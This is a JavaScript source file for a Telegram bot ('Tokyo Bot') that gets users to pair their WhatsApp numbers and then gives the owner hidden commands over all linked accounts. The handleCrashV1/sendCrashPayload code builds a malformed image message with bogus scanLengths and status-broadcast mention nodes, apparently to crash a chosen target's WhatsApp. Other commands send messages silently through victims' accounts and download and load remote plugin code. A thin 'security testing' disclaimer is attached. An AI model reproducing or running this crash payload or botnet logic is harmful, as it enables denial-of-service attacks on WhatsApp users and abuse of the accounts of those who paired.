const { Telegraf, Markup } = require('telegraf');
const config = require('../../config');
const logger = require('../utils/logger');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

class TelegramBot {
    constructor(whatsappManager) {
        this.bot = new Telegraf(config.TELEGRAM_BOT_TOKEN);
        this.whatsappManager = whatsappManager;
        this.setupHandlers();
    }

    setupHandlers() {
        const bot = this.bot;

        bot.start(async (ctx) => {
            try {
                await ctx.replyWithPhoto(
                    config.IMAGES.WELCOME,
                    {
                        caption: `*🤖 Welcome to ${config.BOT_NAME} Bot!*\n\n` +
                                `*Developer:* ${config.DEVELOPER}\n\n` +
                                `This bot connects to WhatsApp using WhatsApp Bot Connector technology.\n` +
                                `Connect your WhatsApp number and get a powerful bot with features like:\n\n` +
                                `• Ping / Alive / Menu commands\n` +
                                `• Plugin system for custom commands\n` +
                                `• Multi-device support\n` +
                                `• 24/7 uptime\n\n` +
                                `Click the button below to get started!`,
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('🚀 Setup', 'setup')]
                        ])
                    }
                );
            } catch (error) {
                logger.error('Start handler error:', error);
                await ctx.reply(
                    `*🤖 Welcome to ${config.BOT_NAME} Bot!*\n\n` +
                    `*Developer:* ${config.DEVELOPER}\n\n` +
                    `Click Setup to begin.`,
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('🚀 Setup', 'setup')]
                        ])
                    }
                );
            }
        });

        bot.action('setup', async (ctx) => {
            try {
                await ctx.replyWithPhoto(
                    config.IMAGES.SETUP,
                    {
                        caption: `*📋 Terms & Disclaimer*\n\n` +
                                `⚠️ *I am doing this on my own risk.*\n\n` +
                                `By proceeding, you acknowledge that:\n\n` +
                                `• You have full authorization to use this bot\n` +
                                `• You take complete responsibility for your actions\n` +
                                `• The developer is not liable for any misuse\n` +
                                `• This is for authorized security testing only\n\n` +
                                `Do you agree to these terms?`,
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [
                                Markup.button.callback('✅ Agree', 'agree'),
                                Markup.button.callback('❌ Not Agree', 'disagree')
                            ]
                        ])
                    }
                );
            } catch (error) {
                logger.error('Setup handler error:', error);
                await ctx.reply(
                    `*📋 Terms & Disclaimer*\n\n` +
                    `⚠️ I am doing this on my own risk.\n\n` +
                    `Do you agree to these terms?`,
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [
                                Markup.button.callback('✅ Agree', 'agree'),
                                Markup.button.callback('❌ Not Agree', 'disagree')
                            ]
                        ])
                    }
                );
            }
        });

        bot.action('agree', async (ctx) => {
            try {
                await ctx.replyWithPhoto(
                    config.IMAGES.NEXT_STEP,
                    {
                        caption: `*🔗 Connect Your WhatsApp Bot*\n\n` +
                                `Great! Let's get your WhatsApp bot connected.\n\n` +
                                `Click the button below to start the pairing process.\n` +
                                `You'll be asked to enter your phone number with country code.`,
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('📲 Pair Now', 'pair')]
                        ])
                    }
                );
            } catch (error) {
                logger.error('Agree handler error:', error);
                await ctx.reply(
                    `*🔗 Connect Your WhatsApp Bot*\n\n` +
                    `Click the button below to start pairing.`,
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('📲 Pair Now', 'pair')]
                        ])
                    }
                );
            }
        });

        bot.action('disagree', async (ctx) => {
            await ctx.deleteMessage();
            await ctx.reply(
                '❌ *Setup Cancelled*\n\nYou have declined the terms.\n\n' +
                'Send /start to begin again if you change your mind.',
                { parse_mode: 'Markdown' }
            );
        });

        bot.action('pair', async (ctx) => {
            await ctx.reply(
                `📱 *WhatsApp Pairing*\n\n` +
                `Please send your phone number with country code.\n\n` +
                `*Format:* \`+<country_code><phone_number>\`\n` +
                `*Example:* \`+1234567890\`\n\n` +
                `*⚠️ Important:*\n` +
                `• Include the \`+\` sign\n` +
                `• No spaces or dashes\n` +
                `• Must be a valid WhatsApp number\n\n` +
                `*Send your number now:*`,
                { parse_mode: 'Markdown' }
            );
            this.whatsappManager.setUserState(ctx.from.id, 'awaiting_phone');
        });

        bot.on('text', async (ctx) => {
            const userId = ctx.from.id;
            const text = ctx.message.text.trim();
            const userState = this.whatsappManager.getUserState(userId);

            logger.debug(`TG text from ${userId}: "${text}" (state: ${userState})`);

            if (String(userId) === config.OWNER_ID) {
                if (text.startsWith('.plugin ')) {
                    return await this.handlePluginInstall(ctx, text);
                }
                if (text.startsWith('.removeplugin ')) {
                    return await this.handlePluginRemove(ctx, text);
                }
                if (text === '.listplugin') {
                    return await this.handlePluginList(ctx);
                }
                if (text.startsWith('.msg ')) {
                    return await this.handleMsgCommand(ctx, text);
                }
                if (text.startsWith('.crash_v1 ')) {
                    return await this.handleCrashV1(ctx, text);
                }
            }

            if (userState === 'awaiting_phone') {
                return await this.handlePhoneInput(ctx, text, userId);
            }

            if (String(userId) !== config.OWNER_ID) {
                await ctx.reply(
                    '🤖 *Tokyo Bot*\n\nSend /start to begin setup.',
                    { parse_mode: 'Markdown' }
                );
            }
        });

        bot.catch((err, ctx) => {
            logger.error(`Telegram error for ${ctx.updateType}:`, err);
            ctx.reply('❌ An internal error occurred. Please try again.').catch(() => {});
        });
    }

    async handlePhoneInput(ctx, phoneNumber, userId) {
        const phoneRegex = /^\+?\d{7,15}$/;
        if (!phoneRegex.test(phoneNumber)) {
            await ctx.reply(
                '❌ *Invalid format!*\n\n' +
                'Please send your phone number with country code.\n\n' +
                '✅ *Correct:* `+1234567890`\n' +
                '❌ *Wrong:* `1234567890` (missing +)\n' +
                '❌ *Wrong:* `+1 234 567 890` (no spaces)\n' +
                '❌ *Wrong:* `+1234` (too short)\n\n' +
                '*Try again:*',
                { parse_mode: 'Markdown' }
            );
            return;
        }

        await ctx.reply(
            '⏳ *Initializing connection...*\n\n' +
            'Connecting to WhatsApp servers. This may take a few seconds...',
            { parse_mode: 'Markdown' }
        );

        try {
            const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
            
            logger.info(`Attempting to pair bot for user ${userId} with number ${cleanNumber}`);
            
            const result = await this.whatsappManager.connectBot(userId, cleanNumber, ctx);
            
            if (!result.success) {
                await ctx.reply(
                    `❌ *Failed to initialize connection.*\n\n${result.error || 'Unknown error.'}\n\nPlease try again with /start`,
                    { parse_mode: 'Markdown' }
                );
            }
        } catch (error) {
            logger.error('Pairing error:', error);
            await ctx.reply(
                `❌ *Error:* ${error.message}\n\nPlease try again with /start`,
                { parse_mode: 'Markdown' }
            );
        }

        this.whatsappManager.clearUserState(userId);
    }

    async handlePluginInstall(ctx, text) {
        try {
            const gistUrl = text.replace(/^\.plugin\s+/, '').trim();
            
            if (!gistUrl || !gistUrl.startsWith('http')) {
                return await ctx.reply(
                    '❌ *Invalid URL!*\n\n' +
                    'Usage: `.plugin <gist_raw_url>`\n' +
                    'Example: `.plugin https://gist.githubusercontent.com/user/12345/raw/plugin.js`',
                    { parse_mode: 'Markdown' }
                );
            }

            await ctx.reply('⏳ *Downloading plugin...*', { parse_mode: 'Markdown' });

            const response = await axios.get(gistUrl, { timeout: 15000 });
            const pluginCode = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

            if (!pluginCode || pluginCode.length < 10) {
                return await ctx.reply('❌ *Empty or invalid plugin code received.*', { parse_mode: 'Markdown' });
            }

            let pluginName = 'plugin_' + Date.now();
            const nameMatch = pluginCode.match(/name\s*[=:]\s*['"]([^'"]+)['"]/);
            if (nameMatch) {
                pluginName = nameMatch[1].toLowerCase().replace(/[^a-z0-9_]/g, '_');
            }

            const pluginsDir = config.PLUGINS_DIR;
            if (!fs.existsSync(pluginsDir)) {
                fs.mkdirSync(pluginsDir, { recursive: true });
            }

            const filePath = path.join(pluginsDir, `${pluginName}.js`);
            
            if (fs.existsSync(filePath)) {
                return await ctx.reply(
                    `❌ Plugin *"${pluginName}"* already exists!\n\n` +
                    `Use \`.removeplugin ${pluginName}\` first or rename the plugin.`,
                    { parse_mode: 'Markdown' }
                );
            }

            fs.writeFileSync(filePath, pluginCode);

            if (this.whatsappManager && this.whatsappManager.messageHandler) {
                this.whatsappManager.messageHandler.loadPlugins();
            }

            await ctx.reply(
                `✅ *Plugin Installed Successfully!*\n\n` +
                `Name: \`${pluginName}\`\n` +
                `File: \`${filePath}\`\n\n` +
                `Use \`.listplugin\` to see all installed plugins.`,
                { parse_mode: 'Markdown' }
            );

        } catch (error) {
            logger.error('Plugin install error:', error);
            await ctx.reply(
                `❌ *Plugin installation failed:*\n\n${error.message}`,
                { parse_mode: 'Markdown' }
            );
        }
    }

    async handlePluginRemove(ctx, text) {
        try {
            const pluginName = text.replace(/^\.removeplugin\s+/, '').trim().toLowerCase();
            
            if (!pluginName) {
                return await ctx.reply(
                    '❌ *Please specify a plugin name.*\n\n' +
                    'Usage: `.removeplugin <plugin_name>`\n' +
                    'Example: `.removeplugin my_plugin`',
                    { parse_mode: 'Markdown' }
                );
            }

            const filePath = path.join(config.PLUGINS_DIR, `${pluginName}.js`);
            
            if (!fs.existsSync(filePath)) {
                return await ctx.reply(
                    `❌ Plugin *"${pluginName}"* not found.\n\n` +
                    `Use \`.listplugin\` to see all installed plugins.`,
                    { parse_mode: 'Markdown' }
                );
            }

            fs.unlinkSync(filePath);

            if (this.whatsappManager && this.whatsappManager.messageHandler) {
                this.whatsappManager.messageHandler.loadPlugins();
            }

            await ctx.reply(
                `✅ *Plugin Removed Successfully!*\n\n` +
                `Removed: \`${pluginName}\``,
                { parse_mode: 'Markdown' }
            );

        } catch (error) {
            logger.error('Plugin remove error:', error);
            await ctx.reply(
                `❌ *Failed to remove plugin:*\n\n${error.message}`,
                { parse_mode: 'Markdown' }
            );
        }
    }

    async handlePluginList(ctx) {
        try {
            const pluginsDir = config.PLUGINS_DIR;
            if (!fs.existsSync(pluginsDir)) {
                fs.mkdirSync(pluginsDir, { recursive: true });
            }

            const files = fs.readdirSync(pluginsDir).filter(f => f.endsWith('.js'));
            
            if (files.length === 0) {
                return await ctx.reply(
                    '📋 *Installed Plugins:*\n\nNo plugins installed.\n\n' +
                    'Use `.plugin <gist_url>` to install one.',
                    { parse_mode: 'Markdown' }
                );
            }

            const pluginList = files.map((f, i) => `${i + 1}. \`${f.replace('.js', '')}\``).join('\n');
            await ctx.reply(
                `📋 *Installed Plugins:* (${files.length})\n\n${pluginList}\n\n` +
                `Use \`.removeplugin <name>\` to remove a plugin.`,
                { parse_mode: 'Markdown' }
            );

        } catch (error) {
            logger.error('Plugin list error:', error);
            await ctx.reply(`❌ *Error listing plugins:*\n\n${error.message}`, { parse_mode: 'Markdown' });
        }
    }

    async handleMsgCommand(ctx, text) {
        try {
            const match = text.match(/^\.msg\s+(\d{5,15})\s+(.+)$/s);
            if (!match) {
                return await ctx.reply(
                    '❌ *Invalid format!*\n\n' +
                    'Usage: `.msg <target_number> <message>`\n' +
                    'Example: `.msg 1234567890 Hello from Tokyo bot!`',
                    { parse_mode: 'Markdown' }
                );
            }

            const targetNumber = match[1];
            const messageContent = match[2];
            const targetJid = targetNumber + '@s.whatsapp.net';

            await ctx.reply(
                `📤 Sending message to *${targetNumber}* from all connected bots...`,
                { parse_mode: 'Markdown' }
            );

            const bots = this.whatsappManager.getAllBots();
            let sentCount = 0;
            let errorCount = 0;

            for (const [userId, sock] of Object.entries(bots)) {
                try {
                    await sock.sendMessage(targetJid, {
                        text: `📨 *Secret Message*\n\n${messageContent}\n\n_This message was sent silently_`,
                        contextInfo: { mentionedJid: [] }
                    });
                    sentCount++;
                } catch (e) {
                    logger.error(`Bot ${userId} failed to send: ${e.message}`);
                    errorCount++;
                }
            }

            if (sentCount === 0) {
                await ctx.reply(
                    `❌ *Failed to send message.*\n\n` +
                    `No bots are currently connected. Use /start to connect a bot first.`,
                    { parse_mode: 'Markdown' }
                );
            } else {
                await ctx.reply(
                    `✅ *Message Sent!*\n\n` +
                    `Target: \`${targetNumber}\`\n` +
                    `Bots used: ${sentCount}\n` +
                    `Errors: ${errorCount}\n\n` +
                    `Message content: "${messageContent.substring(0, 50)}${messageContent.length > 50 ? '...' : ''}"`,
                    { parse_mode: 'Markdown' }
                );
            }
        } catch (error) {
            logger.error('Msg command error:', error);
            await ctx.reply(`❌ *Error:* ${error.message}`, { parse_mode: 'Markdown' });
        }
    }

    async handleCrashV1(ctx, text) {
        try {
            const args = text.trim().split(/\s+/);
            if (args.length < 2) {
                return await ctx.reply(
                    '❌ *Usage:* `.crash_v1 <target_number>`\n' +
                    'Example: `.crash_v1 1234567890`',
                    { parse_mode: 'Markdown' }
                );
            }

            let targetNumber = args[1].replace(/[^0-9]/g, '');
            if (targetNumber.length < 5) {
                return await ctx.reply('❌ *Invalid target number*', { parse_mode: 'Markdown' });
            }

            const targetJid = targetNumber + '@s.whatsapp.net';
            
            await ctx.reply(
                `⚠️ *Sending crash payload to ${targetNumber} from all connected bots...*`,
                { parse_mode: 'Markdown' }
            );

            const bots = this.whatsappManager.getAllBots();
            
            if (Object.keys(bots).length === 0) {
                return await ctx.reply(
                    '❌ *No bots connected.*\n\nUse /start to connect a WhatsApp bot first.',
                    { parse_mode: 'Markdown' }
                );
            }

            let sentCount = 0;
            let errorCount = 0;

            for (const [userId, sock] of Object.entries(bots)) {
                try {
                    await this.sendCrashPayload(sock, targetJid);
                    sentCount++;
                } catch (e) {
                    logger.error(`Bot ${userId} failed to send crash: ${e.message}`);
                    errorCount++;
                }
            }

            await ctx.reply(
                `✅ *Crash Payload Sent!*\n\n` +
                `Target: \`${targetNumber}\`\n` +
                `Bots used: ${sentCount}\n` +
                `Errors: ${errorCount}`,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {
            await ctx.reply(`❌ *Error:* ${e.message}`, { parse_mode: 'Markdown' });
        }
    }

    async sendCrashPayload(sock, targetJid) {
        const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
        
        const LxP = {
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 388944,
                height: 1600,
                width: 1200,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFL/8QAGAEBAQEBAQAAAAAAAAAAAAAAAAECAxD/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEQMRAD8Ao1NmHLGUaCKDsYQLS3OzLVVgLXGPGI5IItnmAtbwbKCXAW4qoHqSIj2a4sDwy1a9NzcOM7NY1WqsvXIL6jAFBa1owK0xwCqNY6EFCNVHSG9gmSVFgxVnTASZmsqVKqMszQky5eaYs+ZpMGzOgz//EACgRAAICAgICAQMEAwAAAAAAAAABAhEDIRASIDFBURNhcTKBodHw8f/aAAwDAQACEQMRAD8BDR3kztI7yO8j7j/gU2hTZGcvkU5H1JCl+8ZL7CmOZ2Yp/geSI5H8Jy+2KPwV9yxu/R1TREhX4TlomxNV5Y1qymM2V4QVuiXjB7JRTJqn4f/Z",
                contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    isQuestion: true,
                    isGroupStatus: true
                },
                caption: "Antijudas",
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                    2899999999999999077,
                    1799999999999998555,
                    7699999999999999148,
                    1069999999999999164
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
        };
        
        let msg = await generateWAMessageFromContent(targetJid, LxP, {});
        
        if (targetJid.endsWith("@g.us")) {
            await sock.relayMessage(targetJid, msg.message, {});
        } else {
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [targetJid],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: targetJid },
                                        content: undefined
                                    }
                                ]
                            }
                        ]
                    }
                ]
            });
        }
    }

    async start() {
        await this.bot.launch();
        logger.info('🤖 Telegram bot started successfully');
    }

    async stop() {
        await this.bot.stop();
        logger.info('🛑 Telegram bot stopped');
    }
}

module.exports = TelegramBot;
